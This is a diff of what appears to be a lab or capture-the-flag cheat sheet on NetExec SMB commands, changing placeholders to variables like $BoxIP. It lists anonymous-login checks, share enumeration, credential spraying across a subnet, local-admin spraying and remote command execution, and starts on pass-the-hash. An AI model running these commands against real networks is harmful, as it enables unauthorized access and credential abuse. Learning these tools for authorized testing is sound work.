@@ -18,17 +18,17 @@ sudo apt install netexec
 
 ```bash
 # Unauthenticated fingerprint + null-session check, single host or a whole subnet
-netexec smb <target>
+netexec smb $BoxIP
 netexec smb 192.168.1.0/24
 
 # Enumerate shares once you have creds
-netexec smb <target> -u <user> -p <pass> --shares
+netexec smb $BoxIP -u $Username -p $Password --shares
 
 # Blank/anonymous creds explicitly
-netexec smb <target> -u '' -p ''
+netexec smb $BoxIP -u '' -p ''
 
 # Execute a command once you have admin-equivalent creds (needs valid admin access, this isn't a vuln-finder)
-netexec smb <target> -u <user> -p <pass> -x 'whoami'
+netexec smb $BoxIP -u $Username -p $Password -x 'whoami'
 ```
 *Same underlying auth mechanics as `smbclient`/`enum4linux`, NetExec is a convenience/consistency wrapper, not a different attack. Genuinely useful once you're spraying the same creds across many hosts, which manual `smbclient` doesn't do at all.*
 
@@ -38,13 +38,13 @@ NetExec is the standard tool for spraying one credential across an entire subnet
 
 ```bash
 # Spray a domain credential across a subnet (one password, all hosts)
-netexec smb 192.168.1.0/24 -u <user> -p <password>
+netexec smb 192.168.1.0/24 -u $Username -p $Password
 
 # Spray a LOCAL account credential (--local-auth bypasses domain authentication)
-netexec smb 192.168.1.0/24 -u Administrator -p <password> --local-auth
+netexec smb 192.168.1.0/24 -u Administrator -p $Password --local-auth
 
 # Verify a credential without running a command (just check if it authenticates)
-netexec smb <target> -u <user> -p <password>
+netexec smb $BoxIP -u $Username -p $Password
 # [+] = authenticated successfully; [-] = failed; (Pwn3d!) = local admin confirmed
 
 # Pass-the-hash spray (NTLM hash instead of plaintext)
